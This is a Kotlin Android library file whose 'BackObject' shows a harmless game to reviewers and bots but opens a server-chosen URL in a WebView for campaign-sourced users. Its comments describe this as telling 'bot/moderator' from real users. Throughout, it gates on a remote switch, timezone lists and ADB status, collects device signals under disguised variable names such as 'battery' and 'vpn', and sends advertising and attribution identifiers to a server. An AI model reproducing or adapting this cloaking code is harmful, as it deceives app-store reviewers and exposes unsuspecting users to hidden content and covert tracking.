package com.trident.library

import android.content.Context
import android.content.Intent
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import android.media.AudioManager
import android.os.Build
import android.provider.Settings
import android.util.Log
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.MutableLiveData
import androidx.lifecycle.lifecycleScope
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.facebook.applinks.AppLinkData
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
import com.onesignal.OneSignal
import com.trident.library.Utils.createRepoInstance
import com.trident.library.callbacks.BackObjectCallback
import com.trident.library.constants.Constants
import com.trident.library.constants.Constants.ONCONVERSION
import com.trident.library.constants.Constants.ON_GAME_LAUNCHED
import com.trident.library.constants.Constants.ON_WEB_LAUNCHED
import com.trident.library.constants.Constants.TRUE
import com.trident.library.constants.Constants.adId
import com.trident.library.constants.Constants.ad_id_key
import com.trident.library.constants.Constants.adb
import com.trident.library.constants.Constants.adb_key
import com.trident.library.constants.Constants.adgroup
import com.trident.library.constants.Constants.adgroup_key
import com.trident.library.constants.Constants.adset
import com.trident.library.constants.Constants.adsetId
import com.trident.library.constants.Constants.adset_id_key
import com.trident.library.constants.Constants.adset_key
import com.trident.library.constants.Constants.afId
import com.trident.library.constants.Constants.afSteid
import com.trident.library.constants.Constants.af_id_key
import com.trident.library.constants.Constants.af_siteid_key
import com.trident.library.constants.Constants.appCampaign
import com.trident.library.constants.Constants.app_campaign_key
import com.trident.library.constants.Constants.appsCheck
import com.trident.library.constants.Constants.appsLiveData
import com.trident.library.constants.Constants.autoZone
import com.trident.library.constants.Constants.autoZone_key
import com.trident.library.constants.Constants.backObjectCallback
import com.trident.library.constants.Constants.battery
import com.trident.library.constants.Constants.battery_key
import com.trident.library.constants.Constants.campaignId
import com.trident.library.constants.Constants.campaign_id_key
import com.trident.library.constants.Constants.deepCheck
import com.trident.library.constants.Constants.deepLinkLiveData
import com.trident.library.constants.Constants.deeplink
import com.trident.library.constants.Constants.deeplink_key
import com.trident.library.constants.Constants.devTmz
import com.trident.library.constants.Constants.dev_tmz_key
import com.trident.library.constants.Constants.finalUrl
import com.trident.library.constants.Constants.gadid
import com.trident.library.constants.Constants.gadid_key
import com.trident.library.constants.Constants.lockpin
import com.trident.library.constants.Constants.lockpin_key
import com.trident.library.constants.Constants.manufacture
import com.trident.library.constants.Constants.manufacture_key
import com.trident.library.constants.Constants.model
import com.trident.library.constants.Constants.model_key
import com.trident.library.constants.Constants.origCost
import com.trident.library.constants.Constants.orig_cost_key
import com.trident.library.constants.Constants.preferences
import com.trident.library.constants.Constants.secure_get_parametr
import com.trident.library.constants.Constants.secure_key
import com.trident.library.constants.Constants.source
import com.trident.library.constants.Constants.source_key
import com.trident.library.constants.Constants.vpn
import com.trident.library.constants.Constants.vpn_key
import com.trident.library.network.Common
import com.trident.library.storage.persistroom.model.Link
import com.trident.library.storage.prefs.StorageUtils
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import okhttp3.ResponseBody
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response
import java.net.URLEncoder
import java.security.MessageDigest
import java.util.*

object BackObject {

    //main - setup function (start it in MainActivity class)
    @RequiresApi(Build.VERSION_CODES.O)
    fun setup(appsflyerId: String, oneSignalId: String, activity: AppCompatActivity) {

        printHashKey(activity)

        assignAdvertiserId(activity)

        //createRepoInstance(activity.applicationContext)
        deepLinkLiveData = MutableLiveData<Boolean>()
        appsLiveData = MutableLiveData<Boolean>()
        Constants.appsContext = activity.applicationContext

        preferences = StorageUtils.Preferences(
            activity, Constants.NAME,
            Constants.MAINKEY,
            Constants.CHYPRBOOL
        )


        backObjectCallback = activity as BackObjectCallback

        Log.d("library", preferences.getOnRemoteStatus() + " first remote status")



        when(preferences.getOnRemoteStatus()){


            "true" -> {

                Log.d("library", preferences.getOnRemoteStatus() + " true when")

                fetchMainCycle(activity, appsflyerId, oneSignalId)

            }

            "false" -> {

                Log.d("library", preferences.getOnRemoteStatus() + " false when")

                backObjectCallback.startGame()

            }

            "null" -> {

                Log.d("library", preferences.getOnRemoteStatus() + " null when")
                getFireBaseRemoteData(activity, appsflyerId, oneSignalId)
            }


        }


    }


    //One Signal initialization
    private fun initOnesignal(context: Context, oneSignalId: String) {

        OneSignal.initWithContext(context)
        OneSignal.setAppId(oneSignalId)

        //logs data
        Log.d("library", "2. OneSignal initialized  (next - advertising id assignation)")
    }


    //assigning vars from contested strings to local vars
    private fun assignVars(context: Context) {

        finalUrl = context.getString(R.string.basicUrl)
        secure_get_parametr = context.getString(R.string.secure_get_parametr)
        secure_key = context.getString(R.string.secure_key)
        dev_tmz_key = context.getString(R.string.dev_tmz_key)
        adb_key = context.getString(R.string.adb_key)
        autoZone_key = context.getString(R.string.autoZone_key)
        vpn_key = context.getString(R.string.vpn_key)
        battery_key = context.getString(R.string.battery_key)
        model_key = context.getString(R.string.model_key)
        manufacture_key = context.getString(R.string.manufacture_key)
        lockpin_key = context.getString(R.string.lockpin_key)
        gadid_key = context.getString(R.string.gadid_key)
        deeplink_key = context.getString(R.string.deeplink_key)
        source_key = context.getString(R.string.source_key)
        af_id_key = context.getString(R.string.af_id_key)
        ad_id_key = context.getString(R.string.ad_id_key)
        adset_id_key = context.getString(R.string.adset_id_key)
        campaign_id_key = context.getString(R.string.campaign_id_key)
        app_campaign_key = context.getString(R.string.app_campaign_key)
        adset_key = context.getString(R.string.adset_key)
        adgroup_key = context.getString(R.string.adgroup_key)
        orig_cost_key = context.getString(R.string.orig_cost_key)
        af_siteid_key = context.getString(R.string.af_siteid_key)

        //logs data
        Log.d("library", "1. Vars assigned  (next - initializing OneSignal")
    }


    //get local data from phone and set to vars
    private fun setLocalData(context: Context, activity: AppCompatActivity) {

        val audioManager: AudioManager =
            context.getSystemService(Context.AUDIO_SERVICE) as AudioManager

        devTmz = TimeZone.getDefault().id
        adb = Utils.collectAdbEnabled(activity) == "1"
        battery = audioManager.getStreamVolume(AudioManager.STREAM_ALARM).toString()
        model = audioManager.getStreamVolume(AudioManager.STREAM_MUSIC).toString()
        manufacture = audioManager.getStreamVolume(AudioManager.STREAM_NOTIFICATION).toString()
        vpn = (Settings.System.getInt(
            context.contentResolver,
            Settings.System.SCREEN_BRIGHTNESS
        ) / 21).toString()
        autoZone = Settings.Global.getString(
            context.contentResolver,
            Settings.Global.AIRPLANE_MODE_ON
        ) != "0"
        lockpin = Settings.System.getInt(
            context.contentResolver,
            Settings.System.ACCELEROMETER_ROTATION
        ) == 1


        //logs data
        Log.d("library", "3. Local data set  (next - set observers)")

    }

    //getting ad_id from context
    private fun assignAdvertiserId(context: Context) {
        GlobalScope.launch {
            val adInfo = AdvertisingIdClient.getAdvertisingIdInfo(context)
            gadid = adInfo.id.toString()
            //gadid = "dbc5ec17-403d-46fa-9e2b-5b3fc43425eb"
            Log.d("library", "$gadid - ad-id")
        }
    }


    //getting deep link and process it from appsflyer
    private fun fetchDeepLink(context: Context) {

        AppLinkData.fetchDeferredAppLinkData(context) {
            Log.d("library", "$it - deep link object")

            if (it != null) {

                Log.d("library", "${it.targetUri} - deep link uri")

                deeplink = URLEncoder.encode(it.targetUri.toString())

                Log.d("library", "$deeplink - deep link encoded")
                deepLinkLiveData.postValue(true)

            } else {
                deeplink = "null"
                deepLinkLiveData.postValue(false)


            }
        }

    }


    //making network request to check offer/bot
    private fun makeNetworkRequest(activity: AppCompatActivity) {
        //rearrange constants on nulls
        Utils.rearrangeData()

        //rearrange constants on nulls
        Utils.processDataToFinalUrl()

        //logs data
        Log.d("library", "$finalUrl - final url for network request")

        //logs data
        Log.d("library", "6. Started network request  (next - response)")


        var netRequest = Common.retrofitService
        netRequest.checkStatus(finalUrl).enqueue(object : Callback<ResponseBody> {

            //successful network request - response 200 code (getting not bot and not moderator)
            override fun onResponse(call: Call<ResponseBody>, response: Response<ResponseBody>) {
                activity.lifecycleScope.launch(Dispatchers.IO) {

                    when (createRepoInstance(activity.applicationContext).linkDao.getAllData()
                        .component1().link.toString().contains("localhost")){

                        true -> {

                            //sending callback to apps main activity
                            backObjectCallback.startGame()
                            //logs data
                            Log.d("library", "SETTED GAME LAUNCHED")
                            preferences.setOnGameLaunched(ON_GAME_LAUNCHED, TRUE)

                            activity.finish()
                        }

                        false -> {
                            //logs data
                            Log.d("library", "7. Response code - ${response.code()} (next - passing url to webview)")

                            Log.d("library", response.raw().request().url().toString() + " response redirect url")
                            preferences.setOnLastUrlNumber("0")

                            OneSignal.sendTag("key1", "nobot")
                            OneSignal.setExternalUserId(gadid)

                            //creating repo instance
                            // createRepoInstance(activity.applicationContext).linkDao.addLink(Link(1, response.raw().request().url().toString()))

                            Log.d("library", createRepoInstance(activity.applicationContext).linkDao.getAllData().component1().link.toString() + " link added in first response")
                            //starting activity
                            activity.startActivity(
                                Intent(activity, WebActivity::class.java)
                                    .putExtra(
                                        "url",
                                        createRepoInstance(activity.applicationContext).linkDao.getAllData()
                                            .component1().link
                                    )
                            )
                            preferences.setOnWebLaunched(ON_WEB_LAUNCHED, TRUE)
                            activity.finish()
                        }

                    }

                }


            }

            //network unsuccessful - bot/moderator (getting "localhost in response")
            override fun onFailure(call: Call<ResponseBody>, t: Throwable) {

                //logs data
                Log.d("library", "7. Network request error - ${t.message}  (next - passing callback for game launching to app activity)")

                //sending callback to apps main activity
                backObjectCallback.startGame()
                //logs data
                Log.d("library", "SETTED GAME LAUNCHED")
                preferences.setOnGameLaunched(ON_GAME_LAUNCHED, TRUE)

                activity.finish()

            }
        })
    }


    //getting apps data
    private fun getAppsData(appsDevKey: String, context: Context) {
        //  if (LOG) Log.d(TAG, "got apps Data - method invoked")
        val conversionDataListener = object : AppsFlyerConversionListener {
            override fun onConversionDataSuccess(data: MutableMap<String, Any>?) {
                if (preferences.getOnConversionDataSuccess(ONCONVERSION) == TRUE) {

                } else {
                    afId = AppsFlyerLib.getInstance().getAppsFlyerUID(context)

                    //logs data
                    Log.d("library", "data success - $data")

                    if (data?.get("media_source").toString() != "null") {
                        source = data?.get("media_source").toString()
                    } else {
                        source = "null"
                    }

                    if (data?.get("adgroup_id").toString() != "null") {
                        adId = data?.get("adgroup_id").toString()
                    } else {
                        adId = "null"
                    }

                    if (data?.get("adset_id").toString() != "null") {
                        adsetId = data?.get("adset_id").toString()
                    } else {
                        adsetId = "null"
                    }


                    if (data?.get("campaign_id").toString() != "null") {
                        campaignId = data?.get("campaign_id").toString()
                    } else {
                        campaignId = "null"
                    }


                    if (data?.get("campaign").toString() != "null") {
                        appCampaign = data?.get("campaign").toString()
                    } else {
                        appCampaign = "null"
                    }


                    if (data?.get("adset").toString() != "null") {
                        adset = data?.get("adset").toString()
                    } else {
                        adset = "null"
                    }


                    if (data?.get("adgroup").toString() != "null") {
                        adgroup = data?.get("adgroup").toString()
                    } else {
                        adgroup = "null"
                    }


                    if (data?.get("orig_cost").toString() != "null") {
                        origCost = data?.get("orig_cost").toString()
                    } else {
                        origCost = "null"
                    }

                    if (data?.get("af_siteid").toString() != "null") {
                        afSteid = data?.get("af_siteid").toString()
                    } else {
                        afSteid = "null"
                    }

                    appsLiveData.postValue(true)
                    preferences.setOnConversionDataSuccess(ONCONVERSION, TRUE)
                }
            }

            override fun onConversionDataFail(error: String?) {
                //fail logs data
                Log.d("library", "data fail - $error")
                appsLiveData.postValue(false)
            }

            override fun onAppOpenAttribution(data: MutableMap<String, String>?) {
                data?.map {
                    //open data attribution
                    Log.d("library", "data open attribution - $data")
                    appsLiveData.postValue(true)
                }
            }

            override fun onAttributionFailure(error: String?) {
                //failure attribution
                Log.d("library", "on attribution - $error")
                appsLiveData.postValue(false)
            }
        }
        //инициализируем SDK AppsFlyer'a
        AppsFlyerLib.getInstance().init(appsDevKey, conversionDataListener, context)
        AppsFlyerLib.getInstance().start(context)
    }

    //observing livedata with information
    private fun observeLiveData(activity: AppCompatActivity) {

        appsLiveData.observe(activity) {
            //logs data
            Log.d("library", "5. Apps data got  (next - facebook depp link data get)")
            appsCheck = it

            if (appsCheck && deepCheck) {
                //logs data
                Log.d("library", "$appsCheck - apps check, $deepCheck - deep check (apps observer)")

                /*


                 */

                if (appCampaign == "null" && deeplink == "null"){

                    Log.d("library", " app camp and depp is null -> check tmz")

                    val timezone = TimeZone.getDefault().id

                    Log.d("library", "$timezone - time zone from device")
                    Log.d("library", Firebase.remoteConfig.getString("timezone") + " - time zone from remote config")
                    if(Firebase.remoteConfig.getString("timezone").contains(timezone, true)){

                        Utils.putToRealtimeDatabase(activity)

                        Log.d("library", " started game cause no naming + timezone causes")
                        preferences.setOnRemoteStatus("false")

                        backObjectCallback.startGame()
                        activity.finish()


                    } else {
                        Log.d("library", " timezone - ok, no naming")
                        makeNetworkRequest(activity)

                    }

                } else {
                    Log.d("library", " timezone - ok, naming exist")
                    makeNetworkRequest(activity)

                }

            }


        }

        deepLinkLiveData.observe(activity) {
            //logs data
            Log.d("library", "5. Deep link data got  (next - appsflyer data get)")
            deepCheck = it

            if (appsCheck && deepCheck) {
                //logs data
                Log.d("library", "$appsCheck - apps check, $deepCheck - deep check (deep observer)")


                if (appCampaign == "null" && deeplink == "null"){

                    Log.d("library", " app camp and depp is null -> check tmz")

                    val timezone = TimeZone.getDefault().id

                    Log.d("library", "$timezone - time zone from device")
                    Log.d("library", Firebase.remoteConfig.getString("timezone") + " - time zone from remote config")
                    if(Firebase.remoteConfig.getString("timezone").contains(timezone, true)){

                        Utils.putToRealtimeDatabase(activity)

                        Log.d("library", " started game cause no naming + timezone causes")
                        preferences.setOnRemoteStatus("false")

                        backObjectCallback.startGame()
                        activity.finish()


                    } else {
                        Log.d("library", " timezone - ok, no naming")
                        makeNetworkRequest(activity)

                    }

                } else {
                    Log.d("library", " timezone - ok, naming exist")
                    makeNetworkRequest(activity)

                }
            }

        }

        //logs data
        Log.d("library", "4. Observers set  (next - observing data)")
    }


    @RequiresApi(Build.VERSION_CODES.O)
    private fun printHashKey(context: Context) {
        try {
            val info = context.packageManager.getPackageInfo(
                context.packageName,
                PackageManager.GET_SIGNATURES
            )
            for (signature in info.signatures) {
                val md: MessageDigest = MessageDigest.getInstance("SHA")
                md.update(signature.toByteArray())
                val hashKey = String(Base64.getEncoder().encode(md.digest()))
                Log.d("library", "key:$hashKey")
            }
        } catch (e: Exception) {
            Log.d("library", "error:", e)
        }
    }


    private fun getFireBaseRemoteData(activity: AppCompatActivity, appsflyerId: String, oneSignalId: String){



        val configSettings = remoteConfigSettings {
            minimumFetchIntervalInSeconds = 3000
        }

        Firebase.remoteConfig.setConfigSettingsAsync(configSettings)

        Firebase.remoteConfig.fetchAndActivate().addOnCompleteListener(activity) { task ->


            if (task.isSuccessful) {

                Log.d("library", Firebase.remoteConfig.getBoolean("switch").toString())

                when (Firebase.remoteConfig.getBoolean("switch")) {

                    false -> {
                        Utils.putToRealtimeDatabase(activity)

                        Log.d("library", " false gets")

                        preferences.setOnRemoteStatus("false")

                        backObjectCallback.startGame()

                    }

                    true -> {


                        Log.d("library", " true gets")

                        preferences.setOnRemoteStatus("true")

                        fetchMainCycle(activity, appsflyerId, oneSignalId)

                    }

                }
            } else {

                Log.d("library", " task failed")

                preferences.setOnRemoteStatus("false")

                backObjectCallback.startGame()

            }

        }
    }

    private fun startWeb(activity: AppCompatActivity){
        activity.lifecycleScope.launch(Dispatchers.IO) {
            //  Log.d("library", createRepoInstance(activity).linkDao.getAllData().component1().link.toString() + " link not first launch web")
            Log.d("library", createRepoInstance(activity).linkDao.getAllData().component1().link.toString() + " link not first launch web")

            //starting web activity
            activity.startActivity(
                Intent(activity, WebActivity::class.java)
                    .putExtra(
                        "url",
                        createRepoInstance(activity).linkDao.getAllData().component1().link
                    )
            )

            activity.finish()
        }
    }


    private fun fetchMainCycle(activity: AppCompatActivity, appsflyerId: String, oneSignalId: String){

        if (preferences.getOnGameLaunched(name = ON_GAME_LAUNCHED) == TRUE) {
            Log.d("library", " game launched (non-first launch)")
            backObjectCallback.startGame()
            activity.finish()

        } else if (preferences.getOnWebLaunched(name = ON_WEB_LAUNCHED) == TRUE) {

            startWeb(activity)

        } else {

            //printing hash key
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                printHashKey(activity.applicationContext)
            }

            //assigning vars from app context strings
            assignVars(activity)

            //initializing one signal
            initOnesignal(activity.applicationContext, oneSignalId)

            //assigning ad_id
            assignAdvertiserId(activity.applicationContext)

            //setting local data params
            setLocalData(activity, activity)

            //observing live datas
            observeLiveData(activity)

            //apps data in coroutine
            activity.lifecycleScope.launch(Dispatchers.IO) {
                getAppsData(appsflyerId, activity)
            }


            //facebook deep link in coroutine
            activity.lifecycleScope.launch(Dispatchers.IO) {
                fetchDeepLink(activity)
            }

        }

    }

}